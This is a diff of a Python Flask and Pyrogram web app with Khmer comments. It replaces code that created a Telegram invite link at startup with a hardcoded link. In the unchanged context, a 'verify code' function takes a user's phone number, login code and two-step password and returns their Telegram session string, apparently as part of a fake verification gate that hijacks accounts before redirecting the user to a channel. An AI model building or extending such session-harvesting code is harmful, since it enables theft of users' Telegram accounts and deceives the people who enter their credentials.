@@ -20,7 +20,8 @@ else:
     CHANNEL_ID = raw_channel_id
 
 temp_clients = {}
-STATIC_INVITE_LINK = ""  # 🛠 កន្លែងរក្សាទុក Link Invite តែមួយដដែលៗ
+# 🛠 កំណត់លីងថេររបស់អ្នកនៅទីនេះផ្ទាល់តែម្តង
+STATIC_INVITE_LINK = "https://t.me/+ZrTrjl4EztZkZTA1"
 
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
@@ -118,17 +119,14 @@ async def async_verify_code(phone_number, code, password):
         except:
             pass
 
-    # 🛠 ប្រើប្រាស់ Link Invite តែមួយដដែលៗ ដែលបានបង្កើតរួចស្រេចពេល Start App
-    invite_link = STATIC_INVITE_LINK if STATIC_INVITE_LINK else "https://t.me/"
-
     return {
         "success": True,
         "message": "Authentication successful!",
         "session": session_string,
-        "redirectUrl": invite_link
+        "redirectUrl": STATIC_INVITE_LINK
     }
 
-# 🛠 Event Listener: Auto-Approve ពេលមានគេ Join (មិនបាច់ Revoke Link ចោលទេ ដើម្បីឱ្យ Link នៅប្រើបានរហូត)
+# 🛠 Event Listener: Auto-Approve ពេលមានគេ Join ຜ່ານ Link Request
 if admin_client:
     @admin_client.on_chat_join_request()
     async def handle_join_request(client, chat_join_request):
@@ -199,7 +197,7 @@ def verify_code():
         return jsonify({"success": False, "error": str(err)}), 400
 
 async def start_admin_client():
-    global CHANNEL_ID, STATIC_INVITE_LINK
+    global CHANNEL_ID
     if admin_client:
         try:
             await admin_client.start()
@@ -217,18 +215,6 @@ async def start_admin_client():
                 chat = await admin_client.get_chat(CHANNEL_ID)
                 CHANNEL_ID = chat.id
                 print(f"Successfully cached channel: {chat.title} ({chat.id})")
-
-            # 🛠 បង្កើត Link Invite តែមួយគត់ (Static Link) ទុកប្រើប្រាស់ពេល App ចាប់ផ្តើមដំណើរការ
-            try:
-                new_link = await admin_client.create_chat_invite_link(
-                    chat_id=CHANNEL_ID,
-                    creates_join_request=True,
-                    name="Main_Permanent_Verify_Link"
-                )
-                STATIC_INVITE_LINK = new_link.invite_link
-                print(f"Successfully created static invite link: {STATIC_INVITE_LINK}")
-            except Exception as e:
-                print(f"Failed to create static invite link: {e}")
 
         except Exception as e:
             print(f"Failed to start admin client or resolve channel: {e}")
